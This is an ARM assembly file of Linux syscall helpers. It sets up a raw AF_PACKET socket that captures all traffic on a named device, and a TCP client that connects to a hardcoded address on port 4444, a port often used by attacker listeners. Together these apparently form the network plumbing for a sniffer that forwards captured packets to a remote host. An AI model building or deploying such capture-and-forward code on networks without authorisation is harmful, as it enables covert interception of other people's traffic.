.text            
.global write
.global read
.global exit
.global client_setup
.global raw_socket_setup

////////////////////////////////////////////////
// Write system call. Write bytes to fd and
// return number of bytes written.
// int write(int fd, const char *buf, unsigned int count);
////////////////////////////////////////////////
write:
    push { r7, lr }
    mov r7, #4			// write system call
    swi 0
    pop { r7, pc }

////////////////////////////////////////////////
// Read system call. Read bytes to fd and
// return number of bytes read.
// int read(int fd, char *buf, unsigned int count);
////////////////////////////////////////////////
read:
    push { r7, lr }
    mov r7, #3			// read system call
    swi 0
    pop { r7, pc }

////////////////////////////////////////////////
// exit system call. exit with provided code
// void exit(int code);
////////////////////////////////////////////////
exit:
    mov r7, #1			// exit system call
    swi 0

////////////////////////////////////////////////
// Create tcp client socket and return fd
// int client_setup(void);
////////////////////////////////////////////////
client_setup:
    push { r4, r6, r7, lr }

    mov r0, #2			// domain AF_INET
    mov r1, #1			// type SOCK_STREAM
    mov r2, #0			// protocol
    mov r7, #0x119		// socket system call
    swi 0

    mov r6, r0			// store fd

    ldr r3, =sockopt
    mov r1, #16000
    str r1, [r3]		// set socket opt to 16000 bytes for max send buffer size
    mov r1, #1			// SOL_SOCKET
    mov r2, #7			// SO_SNDBUF
    mov r4, #4			// sizeof int
    mov r7, #0x126		// setsockopt system call
    swi 0

    mov r0, r6
    ldr r1, =servaddr		// set berkley sockaddr
    mov r2, #16			// set addr length
    mov r7, #0x11b		// connect system call
    swi 0

    cmp r0, #0			// Check connect return
    blt connect_error

    mov r0, r6			// restore fd

    pop { r4, r6, r7, pc }


////////////////////////////////////////////////
// Create and bind raw socket and return fd
// int raw_socket_setup(char *device, unsigned int length);
////////////////////////////////////////////////
raw_socket_setup:
    push { r4, r5, r6, r7, r8, r9, lr }

    mov r8, r0			// device
    mov r9, r1			// length

    mov r0, #17			// domain AF_PACKET
    mov r1, #3			// type SOCK_RAW
    mov r2, #0x0300		// protocol ETH_P_ALL 0x3
    mov r7, #0x119		// socket system call
    swi 0

    mov r5, r0			// socket fd in to r5

    mov r1, #1			// SOL_SOCKET
    mov r2, #2			// SOL_REUSEADDR
    ldr r3, =sockopt
    mov r4, #4			// sizeof int
    mov r7, #0x126		// setsockopt system call
    swi 0

    mov r0, r5			// use raw socket
    ldr r3, =sockopt
    mov r1, #16000
    str r1, [r3]		// set socket opt to 16000 bytes for max recv buffer size
    mov r1, #1			// SOL_SOCKET
    mov r2, #8			// SO_RCVBUF
    mov r4, #4			// sizeof int
    mov r7, #0x126		// setsockopt system call
    swi 0

    mov r0, r5			// use raw socket
    mov r1, #1			// SOL_SOCKET
    mov r2, #25			// SO_BINDTODEVICE
    mov r3, r8			// device argument
    mov r4, r9			// length argument
    mov r7, #0x126		// setsockopt system call
    swi 0

    cmp r0, #0			// Check bind to device return
    blt bind_error

    mov r0, r5			// return the fd

    pop { r4, r5, r6, r7, r8, r9, pc }

connect_error:
    push { r0 }

    mov r0, #2			// stderr
    ldr r1, =conn_err
    ldr r2, =conn_err_len
    mov r7, #4			// write system call
    swi 0

    pop { r0 }
    mov r7, #1			// exit system call
    swi 0

bind_error:
    push { r0 }

    mov r0, #2			// stderr
    ldr r1, =bind_err
    ldr r2, =bind_err_len
    mov r7, #4			// write system call
    swi 0

    pop { r0 }
    mov r7, #1			// exit system call
    swi 0

.data
sockopt:
    .fill 4

conn_err:
    .asciz "failed to connect\n"
conn_err_len = .-conn_err

bind_err:
    .asciz "failed to bind to device\n"
bind_err_len = .-bind_err

servaddr:
    .ascii "\x02\x00"		// AF_INET
    .ascii "\x11\x5c"		// port 4444
    .byte 192,168,1,85		// 192.168.1.85
    .byte 0,0,0,0,0,0,0,0
